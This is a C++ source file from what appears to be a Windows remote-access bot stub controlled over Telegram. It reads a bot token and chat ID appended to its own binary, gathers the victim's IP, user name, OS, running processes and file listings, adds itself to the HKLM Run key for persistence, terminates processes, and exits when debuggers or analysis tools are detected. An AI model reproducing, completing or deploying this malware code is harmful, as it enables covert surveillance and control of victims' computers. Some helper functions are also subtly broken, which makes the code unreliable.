/*
MIT License

Copyright (c) 2020 4B4DB4B3

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/

#include "Manager.h"
#include "Requests.h"

long GetFileSize(const char* filename)
{
    struct stat stat_buf;
    int rc = stat(filename, &stat_buf);
    return rc == 0 ? stat_buf.st_size : -1;
}

void ReadData(Settings* s) {
	char mePath[128] = { 0 };
	GetModuleFileNameA(NULL, mePath, sizeof(mePath) - 1);

	int filesize = GetFileSize(mePath) - sizeof(Settings);

	std::ifstream stub(mePath, std::ifstream::binary);
	stub.seekg(filesize);

	stub.read((char*)&s->botapi, sizeof(s->botapi));
	stub.read((char*)&s->chatid, sizeof(s->chatid));
	stub.read((char*)&s->drop, sizeof(s->drop));
	stub.read((char*)&s->client_delay, sizeof(int));
	stub.read((char*)&s->autorun, sizeof(s->autorun));
	stub.read((char*)&s->auto_delete, sizeof(bool));
	stub.read((char*)&s->autorun_state, sizeof(bool));
	stub.read((char*)&s->drop_run, sizeof(bool));
	stub.read((char*)&s->protect_debuggers, sizeof(bool));

	stub.close();
}

std::string GetOS() {
	OSVERSIONINFOEX info;
	ZeroMemory(&info, sizeof(OSVERSIONINFOEX));
	info.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionEx((LPOSVERSIONINFO)&info);

	double version;

	version = info.dwMajorVersion
		+ (info.dwMinorVersion / 10.0)
		- (info.wProductType == VER_NT_WORKSTATION) ? 0.5 : 0.0;

	return std::to_string(version);
}

std::string GetIP() {
	return GetRequest("api.ipify.org", "4B4DB4B3");
}

std::string GetPCName() {
	char buff[512] = { 0 };
	DWORD len = sizeof(buff) - 1;
	GetUserNameA(buff, &len);
	return buff;
}

std::string ProcessList() {
	std::string list = "";
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap != NULL) {
		PROCESSENTRY32 pe32;
		pe32.dwSize = sizeof(PROCESSENTRY32);

		if (Process32First(hSnap, &pe32)) {
			do {
				list.append(pe32.szExeFile);
				list.append("%0A");
			} while (Process32Next(hSnap, &pe32));
		}
	}
	return list;
}

void Autorun(const char* name) {
	HKEY reg_key = 0;
	const char* address = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	LONG result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, address, 0, KEY_ALL_ACCESS, &reg_key);

	char me[128] = { 0 };
	GetModuleFileName(NULL, me, sizeof(me) - 1);
	result = RegSetValueEx(reg_key, name, 0, REG_SZ, (LPBYTE)me, sizeof(me) - 1);

	RegCloseKey(reg_key);
}

std::string ToLower(std::string str) {
	std::string lower = "";
	std::transform(str.begin(), str.end(), lower.begin(), ::tolower);
	return lower;
}

void Protector() {
	HANDLE hSnap;
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	std::vector<std::string> processes = { "x64dbg", "x32dbg", "ollydbg", "ida", "debugger", "sniffer", "process"};
	std::string process = "";
	while (true) {
		Sleep(3000);
		hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (hSnap != NULL) {
			if (Process32First(hSnap, &pe32)) {
				do {
					process = ToLower(pe32.szExeFile);
					for (int i = 0; i < processes.size(); i++) {
						if (process.find(processes[i]) != std::string::npos) {
							ExitProcess(0);
						}
					}
				} while (Process32Next(hSnap, &pe32));
			}
		}
	}
}

bool FileExists(std::string name) {
	struct stat buffer;
	return (stat(name.c_str(), &buffer) == 0);
}

std::vector<std::string> split(std::string str, char delim)
{
	std::stringstream ss(str);
	std::string item;
	std::vector<std::string> splittedStrings;
	while (std::getline(ss, item, delim))
	{
		splittedStrings.push_back(item);
	}
	return splittedStrings;
}

bool CloseProcessByName(std::string procname) {
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap != NULL) {
		PROCESSENTRY32 pe32;
		pe32.dwSize = sizeof(PROCESSENTRY32);
		if (Process32First(hSnap, &pe32)) {
			do {
				if (strcmp(pe32.szExeFile, procname.c_str()) == 0) {
					HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
					if (hProc != NULL) {
						TerminateProcess(hProc, 0);
						CloseHandle(hProc);
						return true;
					}
					else {
						return false;
					}
				}
			} while (Process32Next(hSnap, &pe32));
		}
	}
	return false;
}

std::string DirectoryObjectsList(std::string dir) {
	std::string names;
	std::string search_path = dir + "/*";
	WIN32_FIND_DATA fd;
	HANDLE hFind = ::FindFirstFile(search_path.c_str(), &fd);
	int index = 0;
	if (hFind != INVALID_HANDLE_VALUE) {
		do {
			if (index <= 1) {
				index++;
				continue;
			}
			names.append(fd.cFileName);
			names.append("%0A");
		} while (::FindNextFile(hFind, &fd));
		::FindClose(hFind);
	}
	return names;
}